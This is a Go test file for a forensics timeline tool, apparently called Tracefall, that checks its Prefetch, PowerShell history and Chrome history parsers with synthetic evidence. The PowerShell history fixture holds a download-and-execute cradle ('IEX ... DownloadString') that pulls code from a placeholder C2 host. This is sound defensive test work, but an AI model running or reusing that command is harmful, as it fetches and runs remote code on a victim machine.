package api

import (
	"database/sql"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	_ "modernc.org/sqlite"

	"tracefall/internal/model"
	"tracefall/internal/prefetch/prefetchgen"
)

// Phase 10A parsers driven through the whole pipeline: discovery must
// classify them as supported, import must produce events, and their
// provenance must resolve.

var pfRun = time.Date(2026, 3, 1, 9, 20, 0, 0, time.UTC)

func samplePrefetch() []byte {
	return prefetchgen.Build(prefetchgen.File{
		Version:        30,
		ExecutableName: "UPDATE.EXE",
		PrefetchHash:   0x0BADF00D,
		RunCount:       4,
		LastRunTimes:   []time.Time{pfRun, pfRun.Add(-2 * time.Hour)},
		Filenames: []string{
			`\VOLUME{01d7}\USERS\JDOE\APPDATA\LOCAL\TEMP\UPDATE.EXE`,
			`\VOLUME{01d7}\WINDOWS\SYSTEM32\NTDLL.DLL`,
		},
		VolumeDevicePath: `\DEVICE\HARDDISKVOLUME2`,
		VolumeSerial:     0xCAFEBABE,
		VolumeCreated:    pfRun.Add(-5000 * time.Hour),
	})
}

func sampleBrowserHistory(t *testing.T) []byte {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "History")
	db, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	for _, s := range []string{
		`CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER)`,
		`CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER, visit_time INTEGER, transition INTEGER)`,
	} {
		if _, err := db.Exec(s); err != nil {
			t.Fatal(err)
		}
	}
	micros := (pfRun.Unix() + 11644473600) * 1_000_000
	db.Exec(`INSERT INTO urls VALUES(1,'https://updates.example.test/payload.exe','Payload',2,?)`, micros)
	db.Exec(`INSERT INTO visits VALUES(1,1,?,805306368)`, micros)
	db.Close()

	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func phase10ACatalog(t *testing.T) map[string][]byte {
	return map[string][]byte{
		"Windows/Prefetch/UPDATE.EXE-0BADF00D.pf": samplePrefetch(),
		"Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt": []byte(
			"Get-Process\nwhoami /priv\nIEX (New-Object Net.WebClient).DownloadString('http://c2.example.test/x')\n"),
		"Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History": sampleBrowserHistory(t),
	}
}

func TestPhase10A_AllThreeArtifactsAreDiscoveredAsSupported(t *testing.T) {
	mux := newTestRouter(t)
	c := mustCreateCase(t, mux, "Phase 10A discovery")
	disc := discoverBinaryDir(t, mux, c.ID, phase10ACatalog(t))

	want := map[string]struct {
		artifactType string
		priority     string
	}{
		"Windows/Prefetch/UPDATE.EXE-0BADF00D.pf":                                                    {model.ArtifactPrefetch, "high"},
		"Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt": {model.ArtifactPowerShellHistory, "high"},
		"Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History":                           {model.ArtifactBrowserHistory, "medium"},
	}
	for path, w := range want {
		sf, ok := sourceFileByPath(disc.SourceFiles, path)
		if !ok {
			t.Fatalf("%s was not discovered", path)
		}
		if !sf.Supported {
			t.Errorf("%s: not supported", path)
		}
		if sf.ArtifactType != w.artifactType {
			t.Errorf("%s: artifact type = %q, want %q", path, sf.ArtifactType, w.artifactType)
		}
		if sf.Priority != w.priority {
			t.Errorf("%s: priority = %q, want %q", path, sf.Priority, w.priority)
		}
		if sf.ImportStatus != model.SourceFileDiscovered {
			t.Errorf("%s: status = %q, want selectable", path, sf.ImportStatus)
		}
	}
	if disc.Coverage.Supported != 3 {
		t.Errorf("coverage supported = %d, want 3", disc.Coverage.Supported)
	}
}

func TestPhase10A_FullPipelineProducesEventsWithProvenance(t *testing.T) {
	mux := newTestRouter(t)
	c := mustCreateCase(t, mux, "Phase 10A pipeline")
	disc := discoverBinaryDir(t, mux, c.ID, phase10ACatalog(t))
	imp := importAllFrom(t, mux, c.ID, disc)
	if imp.EventCount == 0 {
		t.Fatal("the new parsers produced no events")
	}

	timeline := timelineOf(t, mux, c.ID)
	byArtifact := map[string]int{}
	byParser := map[string]int{}
	for _, e := range timeline {
		byArtifact[str(e["artifact_type"])]++
		byParser[str(e["parser"])]++
	}
	for _, want := range []string{model.ArtifactPrefetch, model.ArtifactBrowserHistory} {
		if byArtifact[want] == 0 {
			t.Errorf("no %s events on the timeline (have %v)", want, byArtifact)
		}
	}
	for _, want := range []string{"prefetch@1", "browserhistory@1"} {
		if byParser[want] == 0 {
			t.Errorf("no events from parser %q (have %v)", want, byParser)
		}
	}

	// Prefetch: one event per recorded execution, at the real times.
	var pfTimes []string
	for _, e := range timeline {
		if str(e["artifact_type"]) == model.ArtifactPrefetch {
			pfTimes = append(pfTimes, str(e["timestamp"]))
			if str(e["process_name"]) != "update.exe" {
				t.Errorf("prefetch process = %q, want update.exe", e["process_name"])
			}
		}
	}
	if len(pfTimes) != 2 {
		t.Errorf("prefetch events = %d, want 2 (one per recorded run): %v", len(pfTimes), pfTimes)
	}

	// Browser: the visited host must be carried for correlation.
	for _, e := range timeline {
		if str(e["artifact_type"]) == model.ArtifactBrowserHistory {
			if str(e["network_dest"]) != "updates.example.test" {
				t.Errorf("browser event network_dest = %q", e["network_dest"])
			}
		}
	}
}

// PowerShell history events are timestamp-less by design. They must
// still be stored, keep distinct identities, and declare that their time
// is unknown.
func TestPhase10A_PowerShellHistoryKeepsTimeUnknownAndDistinct(t *testing.T) {
	mux := newTestRouter(t)
	c := mustCreateCase(t, mux, "PowerShell history pipeline")
	disc := discoverBinaryDir(t, mux, c.ID, phase10ACatalog(t))
	importAllFrom(t, mux, c.ID, disc)

	var history []map[string]any
	for _, e := range timelineOf(t, mux, c.ID) {
		if str(e["artifact_type"]) == model.ArtifactPowerShellHistory {
			history = append(history, e)
		}
	}
	if len(history) != 3 {
		t.Fatalf("PowerShell history events = %d, want 3 (one per command)", len(history))
	}
	seen := map[string]bool{}
	for _, e := range history {
		extra, _ := e["extra"].(map[string]any)
		if str(extra["timestamp_known"]) != "false" {
			t.Error("a history event does not declare its timestamp unknown")
		}
		cmd := str(e["command_line"])
		if cmd == "" {
			t.Error("a history event carries no command")
		}
		if seen[cmd] {
			t.Errorf("duplicate command %q -- events collapsed", cmd)
		}
		seen[cmd] = true
	}
}

// A MAM-compressed Prefetch is recognized but not decompressed. It must
// produce a structured parse failure that names the reason, never
// silence and never a fabricated parse.
func TestPhase10A_CompressedPrefetchIsAStructuredFailure(t *testing.T) {
	mux := newTestRouter(t)
	c := mustCreateCase(t, mux, "Compressed prefetch")
	disc := discoverBinaryDir(t, mux, c.ID, map[string][]byte{
		"Windows/Prefetch/EDGE.EXE-11111111.pf": prefetchgen.Compressed(8192),
	})
	sf, ok := sourceFileByPath(disc.SourceFiles, "Windows/Prefetch/EDGE.EXE-11111111.pf")
	if !ok {
		t.Fatal("the compressed Prefetch was not discovered")
	}
	if !sf.Supported {
		t.Error("a compressed Prefetch should still be RECOGNIZED as Prefetch")
	}

	imp := importAllFrom(t, mux, c.ID, disc)
	if len(imp.ParseFailures) != 1 {
		t.Fatalf("parse failures = %d, want 1: %+v", len(imp.ParseFailures), imp.ParseFailures)
	}
	f := imp.ParseFailures[0]
	if f.Message == "" {
		t.Error("the failure carries no message")
	}
	// The message must name the actual limitation. "Could not be parsed"
	// would leave an investigator unable to tell whether the evidence is
	// damaged or Tracefall simply cannot read it.
	if !strings.Contains(strings.ToLower(f.Message), "compressed") {
		t.Errorf("the failure does not explain that the file is compressed: %q", f.Message)
	}
	if f.Category != ParseFailureUnsupported {
		t.Errorf("category = %q, want %q -- the evidence is intact, the tool is the limit", f.Category, ParseFailureUnsupported)
	}
	if f.PartialEvents {
		t.Error("a failed parse must not claim partial events")
	}
	if imp.EventCount != 0 {
		t.Errorf("event count = %d, want 0", imp.EventCount)
	}
}

func str(v any) string {
	s, _ := v.(string)
	return s
}
